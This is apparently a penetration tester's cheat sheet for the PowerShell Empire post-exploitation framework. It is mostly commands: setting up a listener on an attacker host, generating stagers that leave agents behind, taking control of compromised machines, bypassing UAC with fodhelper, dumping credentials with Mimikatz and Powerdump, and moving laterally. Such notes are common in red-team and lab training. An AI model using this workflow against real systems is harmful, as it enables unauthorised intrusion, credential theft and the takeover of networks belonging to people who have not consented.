# Empire

* [https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)
* [https://zayotic.com/posts/empire-cheatsheet/](https://zayotic.com/posts/empire-cheatsheet/)
* [https://github.com/BC-SECURITY/Empire/blob/master/.gitmodules](https://github.com/BC-SECURITY/Empire/blob/master/.gitmodules) (module list)

## Cheat Sheet

```bash
# install it
sudo apt install powershell-empire

# to run it, you need both the server and client
sudo powershell-empire server
sudo powershell-empire client

# list and use listeners
# you need a listener to catch a shell
# do not forget to set Host, and other custom settings
listeners # this moves the menu to the listeners sub-category
uselistener "listenername" # sets the menu into an even further sub-category
info
set Host 192.168.1.5
execute # runs listener
back # goes to listeners category so you can run a stager (aka payload)

# use a stager once a listener is set
# list and use the stager
usestager # lists stager
usestager path_to/stager
info # shows info about stager
set Listener "listenername" # set as the name of listener that is setup
execute # generates the payload aka agent that stager leaves behind

# to view what shells you have open
agents
interact "agentname"

# use modules for more leverage
# best modules
# Powersploit
usemodule situational_awareness/network/powerview/get_user
# Powerup
usemodule powershell/privesc/powerup/allchecks
# Powerdump
usemodule credentials/powerdump
# fodhelper, if local admin launch high-integrity shell and run Mimikatz
usemodule privesc/bypassuac_fodhelper
# Mimikatz, then run sekurlsa::logonpasswords  
usemodule credentials/mimikatz/logonpasswords 
usemodule lateral_movement/ # lateral movement methods
# other modules
usemodule # shows a module list
usemodule "path_to/module"
# show module info and execute a module
info
execute

# when in doubt
help # useful command
```

## fodhelper

* if you have local admin access, this module may be able to launch a high-integrity PowerShell Empire agent through bypassing the UAC (which you need to run Mimikatz, etc...)

```
# load the Empire module
usemodule privesc/bypassuac_fodhelper

# display info
info

# setup a listener
set Listener http

# run the module
execute

# if this works, then you now have a high-integrity Powershell Empire agent which
# is needed in order to run Mimikatz and other high-integrity modules
usemodule credentials/mimikatz/logonpasswords
execute
sekurlsa::logonpasswords

# view the creds that were just dumped
creds

# add your own creds to creds
creds add example.com exampleusername ex4mpl3p4ssw0rd
```
